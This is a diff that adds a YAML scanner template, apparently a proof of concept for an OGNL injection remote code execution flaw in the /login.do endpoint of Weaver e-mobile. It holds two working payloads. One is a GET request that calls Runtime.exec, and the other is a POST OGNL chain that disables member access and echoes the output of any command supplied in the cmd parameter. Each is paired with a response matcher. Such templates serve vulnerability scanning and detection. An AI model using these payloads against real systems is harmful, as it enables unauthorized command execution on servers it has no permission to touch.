@@ -1,0 +1,21 @@
+name: poc-yaml-weaver-emobile-ognl-injection-rce
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+groups:
+  poc1:
+    - method: GET
+      path: /login.do?message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())
+      expression:
+        response.status == 200 && response.body.bcontains(b"Windows IP")
+  poc2:
+    - method: POST
+      path: /login.do
+      body:
+        message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=ipconfig
+      expression:
+        response.status == 200 && response.body.bcontains(b"Windows IP")
+detail:
+  author: sakura404x
+  links:
+    - https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
